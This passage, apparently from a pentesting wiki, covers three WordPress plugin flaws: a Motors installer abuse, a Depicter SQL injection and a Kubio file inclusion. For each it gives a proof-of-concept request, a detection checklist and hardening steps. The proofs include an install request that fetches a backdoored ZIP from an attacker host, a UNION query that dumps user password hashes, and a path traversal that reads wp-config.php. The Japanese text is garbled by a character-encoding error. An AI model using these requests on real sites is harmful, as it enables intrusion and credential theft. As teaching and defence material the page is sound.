#### ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®æµã‚Œ

1. ä½æ¨©é™ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ç™»éŒ²ã™ã‚‹ã‹ä¹—ã£å–ã‚Šï¼ˆSubscriber ã§ååˆ†ï¼‰ã—ã€Motors ãƒ€ãƒƒã‚·ãƒ¥ãƒœãƒ¼ãƒ‰ã® UI ã‹ã‚‰ `mvl_theme_install_base` nonce ã‚’å–å¾—ã—ã¾ã™ã€‚
2. ãƒˆãƒƒãƒ—ãƒ¬ãƒ™ãƒ«ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒæœŸå¾…ã•ã‚Œã‚‹ã‚¹ãƒ©ãƒƒã‚° `motors-car-dealership-classified-listings/` ã¨ä¸€è‡´ã™ã‚‹ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ ZIP ã‚’ä½œæˆã—ã€`*.php` ã‚¨ãƒ³ãƒˆãƒªãƒã‚¤ãƒ³ãƒˆã« backdoor ã‚„ webshell ã‚’åŸ‹ã‚è¾¼ã¿ã¾ã™ã€‚
3. ZIP ã‚’ãƒ›ã‚¹ãƒ†ã‚£ãƒ³ã‚°ã—ã€ãƒãƒ³ãƒ‰ãƒ©ã‚’ã‚ãªãŸã® URL ã«å‘ã‘ã¦ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ©ã‚’èµ·å‹•ã—ã¾ã™ï¼š
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Cookie: wordpress_logged_in_=...
Content-Type: application/x-www-form-urlencoded

action=mvl_theme_install_base&nonce=<leaked_nonce>&plugin=https%3A%2F%2Fattacker.tld%2Fmotors-car-dealership-classified-listings.zip
```
ãƒãƒ³ãƒ‰ãƒ©ãŒ `$_GET['plugin']` ã‚’èª­ã¿å–ã‚‹ãŸã‚ã€åŒã˜ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã‚¯ã‚¨ãƒªæ–‡å­—åˆ—çµŒç”±ã§ã‚‚é€ä¿¡ã§ãã¾ã™ã€‚

#### æ¤œå‡ºãƒã‚§ãƒƒã‚¯ãƒªã‚¹ãƒˆ

- æ¨©é™ãƒã‚§ãƒƒã‚¯ãªã—ã§ `wp_ajax_*` ãƒ•ãƒƒã‚¯ã«æ¥ç¶šã•ã‚ŒãŸ `Plugin_Upgrader`ã€`Theme_Upgrader`ã€ã¾ãŸã¯ã‚«ã‚¹ã‚¿ãƒ ã® `install_plugin.php` ãƒ˜ãƒ«ãƒ‘ãƒ¼ã‚’ãƒ†ãƒ¼ãƒ/ãƒ—ãƒ©ã‚°ã‚¤ãƒ³å†…ã§æ¤œç´¢ã™ã‚‹ã€‚
- `plugin`ã€`package`ã€`source`ã€`url` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å—ã‘å–ã‚Šã€ãã‚Œã‚’ upgrader APIs ã«æ¸¡ã™ãƒãƒ³ãƒ‰ãƒ©ã‚’èª¿æŸ»ã™ã‚‹ã€‚ç‰¹ã«ã‚¹ãƒ©ãƒƒã‚°ãŒãƒãƒ¼ãƒ‰ã‚³ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã‚‹ãŒ ZIP ã®å†…å®¹ãŒæ¤œè¨¼ã•ã‚Œã¦ã„ãªã„å ´åˆã«æ³¨æ„ã€‚
- ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ©æ“ä½œç”¨ã® nonces ã‚’å…¬é–‹ã™ã‚‹ç®¡ç†ãƒšãƒ¼ã‚¸ã‚’ç¢ºèªã™ã‚‹ â€” Subscribers ãŒãƒšãƒ¼ã‚¸ã‚’èª­ã¿è¾¼ã‚ã‚‹å ´åˆã€ãã® nonce ã¯ leak ã™ã‚‹ã¨ä»®å®šã™ã‚‹ã€‚

#### ãƒãƒ¼ãƒ‰ãƒ‹ãƒ³ã‚°

- nonce æ¤œè¨¼ã®å¾Œã€installer ã® AJAX ã‚³ãƒ¼ãƒ«ãƒãƒƒã‚¯ã‚’ `current_user_can('install_plugins')` ã¨ `current_user_can('activate_plugins')` ã§åˆ¶é™ã™ã‚‹ã€‚Motors 5.6.82 ãŒã“ã®ãƒã‚§ãƒƒã‚¯ã‚’å°å…¥ã—ã¦ã“ã®ãƒã‚°ã‚’ä¿®æ­£ã—ãŸã€‚
- ä¿¡é ¼ã•ã‚Œã¦ã„ãªã„ URLs ã‚’æ‹’å¦ã™ã‚‹ï¼šã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ©ã‚’ãƒãƒ³ãƒ‰ãƒ«ã•ã‚ŒãŸ ZIP ã‚„ä¿¡é ¼ã§ãã‚‹ãƒªãƒã‚¸ãƒˆãƒªã«é™å®šã™ã‚‹ã€ã¾ãŸã¯ç½²åä»˜ããƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ãƒãƒ‹ãƒ•ã‚§ã‚¹ãƒˆã‚’å¼·åˆ¶ã™ã‚‹ã€‚
- nonces ã‚’ CSRF ãƒˆãƒ¼ã‚¯ãƒ³ã¨ã—ã¦å³æ ¼ã«æ‰±ã†ï¼›ãã‚Œã‚‰ã¯èªå¯ã‚’æä¾›ã›ãšã€æ¨©é™ãƒã‚§ãƒƒã‚¯ã®ä»£æ›¿ã«ã—ã¦ã¯ã„ã‘ãªã„ã€‚

---

## Unauthenticated SQLi via s search parameter in depicter-* actions (Depicter Slider â‰¤ 3.6.1)

è¤‡æ•°ã® depicter-* ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒ s (search) ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’å—ã‘å–ã‚Šã€ãã‚Œã‚’ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿åŒ–ã›ãšã« SQL ã‚¯ã‚¨ãƒªã«é€£çµã—ã¦ã„ãŸã€‚

- Parameter: s (search)
- Flaw: direct string concatenation in WHERE/LIKE clauses; no prepared statements/sanitization
- Impact: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- depicter-* ã® action handlers ã¨ã€SQL å†…ã§ã® $_GET['s'] ã‚„ $_POST['s'] ã®ç›´æ¥ä½¿ç”¨ã‚’ grep ã§æ¤œç´¢ã™ã‚‹
- s ã‚’é€£çµã—ã¦ã„ã‚‹ $wpdb->get_results()/query() ã«æ¸¡ã•ã‚Œã‚‹ã‚«ã‚¹ã‚¿ãƒ ã‚¯ã‚¨ãƒªã‚’ç¢ºèªã™ã‚‹

Hardening
- å¸¸ã« $wpdb->prepare() ã¾ãŸã¯ wpdb placeholders ã‚’ä½¿ç”¨ã—ã€ã‚µãƒ¼ãƒãƒ¼å´ã§äºˆæœŸã—ãªã„ãƒ¡ã‚¿æ–‡å­—ã‚’æ‹’å¦ã™ã‚‹
- s ã«å¯¾ã—ã¦å³æ ¼ãªè¨±å¯ãƒªã‚¹ãƒˆã‚’è¿½åŠ ã—ã€æœŸå¾…ã•ã‚Œã‚‹æ–‡å­—ã‚»ãƒƒãƒˆ/é•·ã•ã«æ­£è¦åŒ–ã™ã‚‹

---

## Unauthenticated Local File Inclusion via unvalidated template/file path (Kubio AI Page Builder â‰¤ 2.5.1)

ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã§æ”»æ’ƒè€…åˆ¶å¾¡ã®ãƒ‘ã‚¹ã‚’æ­£è¦åŒ–/éš”é›¢ã—ãªã„ã¨ã€ä»»æ„ã®ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‰ã‚Œã€includable PHP/log files ãŒå®Ÿè¡Œæ™‚ã«å–ã‚Šè¾¼ã¾ã‚Œã‚‹ã¨ã‚³ãƒ¼ãƒ‰å®Ÿè¡Œã«ã¤ãªãŒã‚‹ã“ã¨ãŒã‚ã‚‹ã€‚

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: æ­£è¦åŒ–/è¨±å¯ãƒªã‚¹ãƒˆåŒ–ãŒè¡Œã‚ã‚Œã¦ãŠã‚‰ãšã€ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ãŒå¯èƒ½
- Impact: æ©Ÿå¯†æƒ…å ±ã®é–‹ç¤º (wp-config.php)ã€ç‰¹å®šç’°å¢ƒã§ã¯ RCE ã®å¯èƒ½æ€§ï¼ˆlog poisoningã€includable PHPï¼‰

PoC â€“ wp-config.php ã®èª­ã¿å–ã‚Š
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Detection checklist
- realpath() ã«ã‚ˆã‚‹åŒ…å«ãƒã‚§ãƒƒã‚¯ãªã—ã«ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆãƒ‘ã‚¹ã‚’ include()/require()/read ã‚·ãƒ³ã‚¯ã«é€£çµã™ã‚‹ãƒãƒ³ãƒ‰ãƒ©ãŒãªã„ã‹ç¢ºèªã™ã‚‹
- æ„å›³ã—ãŸ templates ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®å¤–ã«åˆ°é”ã™ã‚‹ ../ ã®ã‚ˆã†ãªãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ãƒ‘ã‚¿ãƒ¼ãƒ³ã‚’æ¢ã™

Hardening
- è¨±å¯ãƒªã‚¹ãƒˆåŒ–ã•ã‚ŒãŸãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã‚’å¼·åˆ¶ã™ã‚‹ï¼›realpath() ã§è§£æ±ºã—ã€str_starts_with(realpath(file), realpath(allowed_base)) ã‚’è¦æ±‚ã™ã‚‹
- å…¥åŠ›ã‚’æ­£è¦åŒ–ã™ã‚‹ï¼›ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã‚„çµ¶å¯¾ãƒ‘ã‚¹ã‚’æ‹’å¦ã™ã‚‹ï¼›sanitize_file_name() ã¯ãƒ•ã‚¡ã‚¤ãƒ«åã®ã¿ï¼ˆãƒ•ãƒ«ãƒ‘ã‚¹ã«ã¯ä½¿ç”¨ã—ãªã„ï¼‰ã«ä½¿ã†


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025â€™s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)
- [Critical Arbitrary File Upload Vulnerability in Motors Theme Affecting 20k+ Sites](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/)

{{#include ../../banners/hacktricks-training.md}}
